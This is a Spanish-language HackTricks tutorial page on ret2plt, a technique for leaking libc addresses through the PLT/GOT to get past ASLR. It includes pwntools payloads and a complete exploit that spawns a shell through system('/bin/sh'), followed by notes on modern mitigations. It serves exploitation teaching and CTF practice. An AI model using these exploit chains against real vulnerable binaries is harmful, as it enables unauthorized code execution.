# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Información básica

El objetivo de esta técnica sería **leak una dirección de una función del PLT** para poder bypass ASLR. Esto se debe a que, por ejemplo, si leak la dirección de la función `puts` de la libc, puedes entonces **calcular cuál es la base de `libc`** y calcular offsets para acceder a otras funciones como **`system`**.

Esto se puede hacer con un payload de `pwntools` como ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Observa cómo **`puts`** (usando la dirección desde la PLT) se llama con la dirección de `puts` ubicada en la GOT (Global Offset Table). Esto es porque para cuando `puts` imprima la entrada de la GOT de puts, esta **entrada contendrá la dirección exacta de `puts` en memoria**.

Fíjate también cómo la dirección de `main` se usa en el exploit para que, cuando `puts` termine su ejecución, el **binario llame a `main` de nuevo en lugar de salir** (por lo que la dirección leak seguirá siendo válida).

> [!CAUTION]
> Ten en cuenta que para que esto funcione el **binario no puede estar compilado con PIE** o debes haber **encontrado un leak para bypass PIE** para poder conocer la dirección de la PLT, GOT y main. De lo contrario, necesitas bypass PIE primero.

Puedes encontrar un [**ejemplo completo de este bypass aquí**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). Este fue el exploit final de ese **ejemplo**:

<details>
<summary>Ejemplo completo de exploit (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Consideraciones modernas

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. Si el binario no tiene un stub `foo@plt`, aún puedes leakear la dirección resuelta con `puts(elf.got['foo'])` y luego **retornar directamente a la entrada GOT** (`flat(padding, elf.got['foo'])`) para saltar a libc una vez que el lazy binding haya completado.
- **Full RELRO / `-Wl,-z,now`**: el GOT es de solo lectura pero ret2plt aún funciona para leaks porque solo lees la casilla del GOT. Si el símbolo nunca fue llamado, tu primer ret2plt también realizará lazy binding y luego imprimirá la casilla resuelta.
- **ASLR + PIE**: si PIE está habilitado, primero leakea un puntero de código (p. ej., saved return address, function pointer, o una entrada `.plt` vía otro format‑string/infoleak) para calcular la base PIE, luego construye la cadena ret2plt con las direcciones PLT/GOT reubicadas.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: las entradas PLT son válidos BTI landing pads (`bti c`), así que al explotar binarios con BTI habilitado prefiere saltar al stub PLT (u otro gadget anotado con BTI) en lugar de ir directamente a un gadget de libc sin BTI; de lo contrario la CPU lanzará fallos `BRK`/`PAC`.
- **Quick resolution helper**: si la función objetivo aún no está resuelta y necesitas un leak en una sola ejecución, encadena la llamada PLT dos veces: primero `elf.plt['foo']` (para resolver) y luego otra vez `elf.plt['foo']` con la dirección GOT como argumento para imprimir la casilla ahora rellenada.

## Otros ejemplos & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, el primer paso es llenar un overflow hasta el byte 0x00 del canary para luego llamar a puts y leakearlo. Con el canary se crea un ROP gadget para llamar a puts y leakear la dirección de puts desde el GOT y un ROP gadget para llamar a `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow en main desde una función hija. ROP gadget para llamar a puts y leakear la dirección de puts desde el GOT y luego llamar a un one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
